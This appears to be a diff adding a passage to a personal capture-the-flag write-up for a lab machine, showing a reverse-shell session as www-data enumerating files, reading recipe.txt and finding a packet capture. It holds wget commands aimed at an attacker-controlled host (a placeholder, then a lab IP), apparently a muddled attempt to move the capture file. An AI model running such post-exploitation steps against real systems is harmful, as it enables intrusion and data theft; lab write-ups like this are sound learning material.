@@ -501,4 +501,43 @@ Someone asked what our main ingredient to our spice soup is today. I figured I c
 > [!info]
 > Need to know what to look for. This is the part i struggle with but its all about enumeration.
 
+```
+www-data@startup:/$ ls
+ls
+bin   home	      lib	  mnt	      root  srv  vagrant
+boot  incidents       lib64	  opt	      run   sys  var
+dev   initrd.img      lost+found  proc	      sbin  tmp  vmlinuz
+etc   initrd.img.old  media	  recipe.txt  snap  usr  vmlinuz.old
+www-data@startup:/$ cat recipe.txt
+cat recipe.txt
+Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
+www-data@startup:/$ cd los	
+cd lost+found/
+bash: cd: lost+found/: Permission denied
+www-data@startup:/$ cd incidents
+cd incidents
+www-data@startup:/incidents$ ls
+ls
+suspicious.pcapng
+www-data@startup:/incidents$ wget http://<attacker-ip>:8080/shell_traffic.pcapng
+bash: attacker-ip: No such file or directory.pcapng 
+www-data@startup:/incidents$ wget http://10.67.86.193:8080/suspicious.pcapng
+wget http://10.67.86.193:8080/suspicious.pcapng
+--2026-02-12 19:02:38--  http://10.67.86.193:8080/suspicious.pcapng
+Connecting to 10.67.86.193:8080... connected.
+HTTP request sent, awaiting response... 404 File not found
+2026-02-12 19:02:38 ERROR 404: File not found.
+www-data@startup:/incidents$ ls
+ls
+suspicious.pcapng
+www-data@startup:/incidents$ ls -la
 ls -la
+total 40
+drwxr-xr-x  2 www-data www-data  4096 Nov 12  2020 .
+drwxr-xr-x 25 root     root      4096 Feb 12 17:32 ..
+-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
+```
+
+> [!note]
+> Think im losing my head but tried to capture this .pcapng file and cant get it?
+
